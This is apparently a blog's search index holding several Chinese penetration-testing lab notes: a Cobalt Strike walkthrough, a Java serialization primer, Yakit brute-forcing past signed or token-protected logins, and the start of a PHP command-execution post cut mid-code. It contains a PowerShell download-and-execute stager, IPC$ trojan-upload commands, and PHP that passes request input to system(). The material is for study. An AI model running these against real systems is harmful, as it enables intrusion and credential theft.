<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>渗透测试-cs工具</title>
      <link href="/2025/08/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-cs%E5%B7%A5%E5%85%B7/"/>
      <url>/2025/08/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-cs%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h3 id="1、Cobalt-Strike"><a href="#1、Cobalt-Strike" class="headerlink" title="1、Cobalt Strike"></a>1、Cobalt Strike</h3><p>你可以把 Cobalt Strike 理解为一个 <strong>“网络攻击的指挥控制中心”</strong>（C2, Command and Control）。攻击者（红队）先在被攻击目标（肉鸡）上植入一个小小的“木马”（叫做 <strong>Beacon</strong>），然后通过 Cobalt Strike 的服务端（团队服务器）向这些 Beacon 发送命令，Beacon 执行命令后再将结果回传。攻击者通过一个图形化的客户端来操作这一切。</p><h3 id="2、cs利用"><a href="#2、cs利用" class="headerlink" title="2、cs利用"></a>2、cs利用</h3><p>攻击机：kali，win11</p><p>靶机：win7</p><p>在kali启动cs服务端</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509041626529.png"></p><p>win11客户端连接服务端</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509041631878.png"></p><p>添加监听主机</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509041634648.png"></p><p>生成木马</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509041632785.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509041635194.png"></p><p>将muma保存到桌面</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509041635022.png"></p><p>利用ipc管道将文件上传到靶机</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//连接靶机</span><br><span class="line">net use \\靶机ip\ipc$ &lt;靶机密码&gt; /user:&lt;靶机用户名&gt;</span><br><span class="line"></span><br><span class="line">//上传到靶机c盘</span><br><span class="line">copy &lt;木马地址路径&gt; \\靶机ip\C$</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509041654885.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509041654320.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509041654971.png"></p><p>在靶机上双击运行木马，再回到客户端查看</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509041655814.png"></p><p>成功上线！！！</p><p>执行命令查看ipconfig</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509041659189.png"></p><p>尝试其他上线方式</p><p>powershell</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509041702903.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.18.172:9677/a&#x27;))&quot;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509041720392.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509041721754.png"></p><p>成功上线！！！！</p><h3 id="搭建socks代理"><a href="#搭建socks代理" class="headerlink" title="搭建socks代理"></a>搭建socks代理</h3><p>环境</p><p>攻击机：win11、kali</p><p>靶机：win7、win7克隆</p><table><thead><tr><th>win11</th><th>nat</th><th>192.168.18.175</th></tr></thead><tbody><tr><td>kali</td><td>nat</td><td>192.168.18.172</td></tr><tr><td>win7pc1</td><td>nat\vmnet1</td><td>192.168.18.143、192.168.159.10</td></tr><tr><td>win7pc2</td><td>vmnet1</td><td>192.168.159.20</td></tr></tbody></table><p>此时win11无法ping通pc2，kali也无法ping通pc2</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509041934585.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509041946973.png"></p><p>上线木马之后，开启sock代理</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509041938327.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509041938761.png"></p><p>查看代理设置</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509041947244.png"></p><p>这里端口就是服务端socks监听端口，去服务端查看端口是否开启</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netstat -tunlp | grep &lt;你开启的socks端口&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509041948808.png"></p><p>编辑配置文件，挂上团队服务socks</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/proxchains.conf</span><br></pre></td></tr></table></figure><p>再nmap进行扫描</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509042023942.png"></p><p>成功扫描到pc2</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>java序列化和反序列化</title>
      <link href="/2025/08/26/java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2025/08/26/java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h3 id="一、核心概念"><a href="#一、核心概念" class="headerlink" title="一、核心概念"></a>一、核心概念</h3><h4 id="1-序列化-Serialization"><a href="#1-序列化-Serialization" class="headerlink" title="1. 序列化 (Serialization)"></a>1. 序列化 (Serialization)</h4><ul><li><strong>定义</strong>： 将 <strong>Java 对象</strong>的状态信息转换为一种<strong>字节序列</strong>的过程。</li><li><strong>目的</strong>： 这个字节序列可以被轻松地<strong>存储到文件</strong>（.ser 文件）、<strong>写入数据库</strong>，或者通过<strong>网络传输</strong>到另一个系统。</li><li><strong>比喻</strong>： 就像把一辆汽车<strong>拆解</strong>成一大堆标准化的零件，然后整齐地打包进箱子，以便于运输或存放在仓库里。这个过程只打包了汽车的<strong>属性</strong>（颜色、型号、零件）和<strong>设计图信息</strong>（类结构），但并不打包制造汽车的“工厂”本身（即类的代码逻辑）。</li></ul><h4 id="2-反序列化-Deserialization"><a href="#2-反序列化-Deserialization" class="headerlink" title="2. 反序列化 (Deserialization)"></a>2. 反序列化 (Deserialization)</h4><ul><li><strong>定义</strong>： 是序列化的逆过程。将字节序列<strong>重建</strong>为内存中的 Java 对象。</li><li><strong>目的</strong>： 从文件、数据库或网络流中恢复出与序列化时状态完全一致的对象。</li><li><strong>比喻</strong>： 就像在目的地收到那箱零件后，根据里面的<strong>设计图信息</strong>，将零件重新<strong>组装</strong>回一辆一模一样的汽车。</li></ul><h3 id="实例化类调用函数"><a href="#实例化类调用函数" class="headerlink" title="实例化类调用函数"></a>实例化类调用函数</h3><p>编写代码</p><p>Test类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Cxk</span> <span class="variable">kun</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cxk</span>();</span><br><span class="line">        kun.talk();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Cxk类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Cxk</span> <span class="keyword">extends</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Person类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String tall;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">talk</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;i am person！！！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509031653684.png"></p><h3 id="重写talk函数，再次调用"><a href="#重写talk函数，再次调用" class="headerlink" title="重写talk函数，再次调用"></a>重写talk函数，再次调用</h3><p>在Cxk中重写方法</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class Cxk extends Person &#123;</span><br><span class="line">    public String name;</span><br><span class="line">    public void talk()&#123;</span><br><span class="line">        System.out.println(&quot;i am kun！！！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509031646529.png"></p><h3 id="编写序列化反序列化函数，对象序列化保存到文件里，再反序列化输出"><a href="#编写序列化反序列化函数，对象序列化保存到文件里，再反序列化输出" class="headerlink" title="编写序列化反序列化函数，对象序列化保存到文件里，再反序列化输出"></a>编写序列化反序列化函数，对象序列化保存到文件里，再反序列化输出</h3><p>test</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException,</span><br><span class="line">            ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">p</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>();</span><br><span class="line">        p.age = <span class="number">22</span>;</span><br><span class="line">        p.name = <span class="string">&quot;thy&quot;</span>;</span><br><span class="line">        serialize(p, <span class="string">&quot;thy.bin&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;反序列化结果：&quot;</span> + deserialize(<span class="string">&quot;thy.bin&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj, String filePath)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileOutputStream</span> <span class="variable">fileOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(filePath);</span><br><span class="line">             <span class="type">ObjectOutputStream</span> <span class="variable">objectOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOut)) &#123;</span><br><span class="line">            objectOut.writeObject(obj);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(String filePath)</span> <span class="keyword">throws</span> IOException,</span><br><span class="line">            ClassNotFoundException &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">FileInputStream</span> <span class="variable">fileIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filePath);</span><br><span class="line">             <span class="type">ObjectInputStream</span> <span class="variable">objectIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileIn)) &#123;</span><br><span class="line">            <span class="keyword">return</span> objectIn.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>person</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException,</span><br><span class="line">            ClassNotFoundException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;已反序列化&quot;</span>);</span><br><span class="line"><span class="comment">// 默认的反序列化操作</span></span><br><span class="line">        in.defaultReadObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509031814014.png"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试-前端逆向验签</title>
      <link href="/2025/08/24/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%89%8D%E7%AB%AF%E9%80%86%E5%90%91%E9%AA%8C%E7%AD%BE/"/>
      <url>/2025/08/24/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%89%8D%E7%AB%AF%E9%80%86%E5%90%91%E9%AA%8C%E7%AD%BE/</url>
      
        <content type="html"><![CDATA[<h3 id="1、yakit验签与数据加密"><a href="#1、yakit验签与数据加密" class="headerlink" title="1、yakit验签与数据加密"></a>1、yakit验签与数据加密</h3><h4 id="①验签"><a href="#①验签" class="headerlink" title="①验签"></a>①验签</h4><p>随便输入用户名和密码登录</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509011640566.png"></p><p>抓包，发现有个签名部分</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509011641375.png"></p><p>分析前端加密代码</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> iv = <span class="title class_">CryptoJS</span>.<span class="property">lib</span>.<span class="property">WordArray</span>.<span class="title function_">random</span>(<span class="number">128</span>/<span class="number">8</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">generateKey</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>  <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(<span class="string">&quot;1234123412341234&quot;</span>)  <span class="comment">// 十六位十六进制数作为密钥</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> key = <span class="title function_">generateKey</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解密方法</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">Decrypt</span>(<span class="params">word</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>  <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">decrypt</span>(word, key, &#123;<span class="attr">iv</span>: iv&#125;).<span class="title function_">toString</span>(); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 加密方法</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">Encrypt</span>(<span class="params">word</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">info</span>(word);</span><br><span class="line">        <span class="keyword">return</span>  <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">encrypt</span>(word, key, &#123;<span class="attr">iv</span>: iv&#125;).<span class="title function_">toString</span>(); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">getData</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;username&quot;</span>).<span class="property">value</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;password&quot;</span>).<span class="property">value</span>,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">outputObj</span>(<span class="params">jsonData</span>) &#123;</span><br><span class="line">        <span class="keyword">const</span> word = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(jsonData);</span><br><span class="line">        <span class="keyword">return</span> &#123;</span><br><span class="line">            <span class="string">&quot;data&quot;</span>: <span class="title class_">Encrypt</span>(word),</span><br><span class="line">            <span class="string">&quot;key&quot;</span>: key.<span class="title function_">toString</span>(),</span><br><span class="line">            <span class="attr">iv</span>: iv.<span class="title function_">toString</span>(),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">submitJSON</span>(<span class="params">event</span>) &#123;</span><br><span class="line">        event.<span class="title function_">preventDefault</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> url = <span class="string">&quot;/crypto/js/lib/aes/cbc/handler&quot;</span>;</span><br><span class="line">        <span class="keyword">let</span> jsonData = <span class="title function_">getData</span>();</span><br><span class="line">        <span class="keyword">let</span> submitResult = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="title function_">outputObj</span>(jsonData), <span class="literal">null</span>, <span class="number">2</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;key&quot;</span>, key)</span><br><span class="line">        <span class="title function_">fetch</span>(url, &#123;</span><br><span class="line">            <span class="attr">method</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">            <span class="attr">headers</span>: &#123;</span><br><span class="line">                <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">body</span>: submitResult,</span><br><span class="line">        &#125;)</span><br><span class="line">            .<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> response.<span class="title function_">text</span>())</span><br><span class="line">            .<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Success:&quot;</span>, data);</span><br><span class="line">                <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">innerHTML</span> = data;</span><br><span class="line">            &#125;)</span><br><span class="line">            .<span class="title function_">catch</span>(<span class="function">(<span class="params">error</span>) =&gt;</span> &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Error:&quot;</span>, error);</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;json-form&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;change&quot;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> jsonData = &#123;</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;username&quot;</span>).<span class="property">value</span>,</span><br><span class="line">            <span class="string">&quot;password&quot;</span>: <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;password&quot;</span>).<span class="property">value</span>,</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;encrypt&quot;</span>).<span class="property">innerHTML</span> = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="title function_">outputObj</span>(jsonData), <span class="literal">null</span>, <span class="number">2</span>)</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;input&quot;</span>).<span class="property">innerHTML</span> = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(jsonData, <span class="literal">null</span>, <span class="number">2</span>)</span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;json-form&quot;</span>).<span class="title function_">addEventListener</span>(<span class="string">&quot;submit&quot;</span>, submitJSON)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>对用户名和密码进行了加密之后生成的签名</p><p>写热加载代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//密钥是1234123412341234</span><br><span class="line">func sign(user,pass)&#123;</span><br><span class="line">    return codec.EncodeToHex(codec.HmacSha256(&quot;1234123412341234&quot;,</span><br><span class="line">f`username=$&#123;user&#125;&amp;password=$&#123;pass&#125;`)~)</span><br><span class="line">&#125;</span><br><span class="line">//提取用户名和密码</span><br><span class="line">signRequest = result =&gt; &#123;</span><br><span class="line">    pairs := result.SplitN(&quot;|&quot;,2)</span><br><span class="line">    dump(pairs)</span><br><span class="line">    return sign(pairs[0],pairs[1])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>启用后将密码字典设置为变量</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509011649377.png"></p><p>构造请求</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509011649046.png"></p><p>再进行爆破</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509011650044.png"></p><p>成功爆破</p><h4 id="②数据加密"><a href="#②数据加密" class="headerlink" title="②数据加密"></a>②数据加密</h4><p>前端加密代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">    </span><br><span class="line">    var iv = CryptoJS.lib.WordArray.random(128/8);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    function generateKey() &#123;</span><br><span class="line">        return  CryptoJS.enc.Utf8.parse(&quot;1234123412341234&quot;)  // 十六位十六进制数作为密钥</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    const key = generateKey()</span><br><span class="line"></span><br><span class="line">    // 解密方法</span><br><span class="line">    function Decrypt(word) &#123;</span><br><span class="line">        return  CryptoJS.AES.decrypt(word, key, &#123;iv: iv&#125;).toString(); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 加密方法</span><br><span class="line">    function Encrypt(word) &#123;</span><br><span class="line">        console.info(word);</span><br><span class="line">        return  CryptoJS.AES.encrypt(word, key, &#123;iv: iv&#125;).toString(); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getData() &#123;</span><br><span class="line">        return &#123;</span><br><span class="line">            &quot;username&quot;: document.getElementById(&quot;username&quot;).value,</span><br><span class="line">            &quot;password&quot;: document.getElementById(&quot;password&quot;).value,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function outputObj(jsonData) &#123;</span><br><span class="line">        const word = JSON.stringify(jsonData);</span><br><span class="line">        return &#123;</span><br><span class="line">            &quot;data&quot;: Encrypt(word),</span><br><span class="line">            &quot;key&quot;: key.toString(),</span><br><span class="line">            iv: iv.toString(),</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function submitJSON(event) &#123;</span><br><span class="line">        event.preventDefault();</span><br><span class="line"></span><br><span class="line">        const url = &quot;/crypto/js/lib/aes/cbc/handler&quot;;</span><br><span class="line">        let jsonData = getData();</span><br><span class="line">        let submitResult = JSON.stringify(outputObj(jsonData), null, 2)</span><br><span class="line">        console.log(&quot;key&quot;, key)</span><br><span class="line">        fetch(url, &#123;</span><br><span class="line">            method: &quot;POST&quot;,</span><br><span class="line">            headers: &#123;</span><br><span class="line">                &quot;Content-Type&quot;: &quot;application/json&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            body: submitResult,</span><br><span class="line">        &#125;)</span><br><span class="line">            .then(response =&gt; response.text())</span><br><span class="line">            .then(data =&gt; &#123;</span><br><span class="line">                console.log(&quot;Success:&quot;, data);</span><br><span class="line">                document.body.innerHTML = data;</span><br><span class="line">            &#125;)</span><br><span class="line">            .catch((error) =&gt; &#123;</span><br><span class="line">                console.error(&quot;Error:&quot;, error);</span><br><span class="line">            &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    document.getElementById(&quot;json-form&quot;).addEventListener(&quot;change&quot;, () =&gt; &#123;</span><br><span class="line">        let jsonData = &#123;</span><br><span class="line">            &quot;username&quot;: document.getElementById(&quot;username&quot;).value,</span><br><span class="line">            &quot;password&quot;: document.getElementById(&quot;password&quot;).value,</span><br><span class="line">        &#125;;</span><br><span class="line">        document.getElementById(&quot;encrypt&quot;).innerHTML = JSON.stringify(outputObj(jsonData), null, 2)</span><br><span class="line">        document.getElementById(&quot;input&quot;).innerHTML = JSON.stringify(jsonData, null, 2)</span><br><span class="line">    &#125;)</span><br><span class="line">    document.getElementById(&quot;json-form&quot;).addEventListener(&quot;submit&quot;, submitJSON)</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>热加载代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">aescbc = result =&gt; &#123;</span><br><span class="line">result = codec.AESCBCEncryptWithPKCS7Padding(</span><br><span class="line">codec.DecodeHex(`31323334313233343132333431323334`)~,</span><br><span class="line">result,</span><br><span class="line">codec.DecodeHex(`255a6d83ab4a04d6e8308b9feb9e3a1b`)~,</span><br><span class="line">)~</span><br><span class="line">return string(result)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造请求</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509011704011.png"></p><p>爆破，但是爆破失败</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509011704127.png"></p><h3 id="2、token防爆破"><a href="#2、token防爆破" class="headerlink" title="2、token防爆破"></a>2、token防爆破</h3><p>随意输入账户密码进行抓包</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509011535966.png"></p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509011536639.png"></p><p>数据包发送到fuzz模块，并点击发送请求，找到响应返回的token值</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509011537296.png"></p><p>点击左侧配置，添加一个数据提取器，提取xpath数据，输入规则&#x2F;&#x2F;input[@name&#x3D;’token’]&#x2F;@value</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509011539326.png"></p><p>再设置一个变量，变量名为pass，值就是密码字典</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509011541598.png"></p><p>再次将数据包发送到fuzz，后点击左侧序列，添加序列</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509011542857.png"></p><p>在第二个序列中引用变量</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509011544385.png"></p><p>最后开始执行爆破，成功爆破</p><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202509011545287.png"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试-命令执行&amp;jwt伪造以及越权</title>
      <link href="/2025/08/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;jwt%E4%BC%AA%E9%80%A0%E4%BB%A5%E5%8F%8A%E8%B6%8A%E6%9D%83/"/>
      <url>/2025/08/23/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&amp;jwt%E4%BC%AA%E9%80%A0%E4%BB%A5%E5%8F%8A%E8%B6%8A%E6%9D%83/</url>
      
        <content type="html"><![CDATA[<h3 id="1、php命令执行函数和代码执行函数"><a href="#1、php命令执行函数和代码执行函数" class="headerlink" title="1、php命令执行函数和代码执行函数"></a>1、php命令执行函数和代码执行函数</h3><h4 id="①命令执行函数"><a href="#①命令执行函数" class="headerlink" title="①命令执行函数"></a>①命令执行函数</h4><ul><li><p>system()</p><p>执行系统命令，自带回显</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281548796.png"></p></li><li><p>exec()</p><p>执行系统命令，无回显，需要输出，且只输出最后一行</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">exec</span>(<span class="variable">$test</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/thy295/picgo/main/img/202508281552697.png"></p></li><li><p>shell_exec()</p><p>执行系统命令，无回显，需要输出</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$test</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$test</span>);</span><br><span class="line"><span 